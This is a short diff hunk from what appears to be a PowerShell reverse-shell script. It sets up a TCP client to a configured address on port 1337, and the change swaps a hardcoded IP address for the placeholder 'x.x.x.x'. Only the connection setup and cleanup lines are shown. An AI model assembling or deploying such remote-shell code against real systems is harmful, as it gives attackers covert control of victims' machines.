@@ -3,7 +3,7 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 // Setup IPADDR
-$address = '214.15.102.102'
+$address = 'x.x.x.x'
 // Setup PORT
 $port = '1337'
 $client = New-Object system.net.sockets.tcpclient
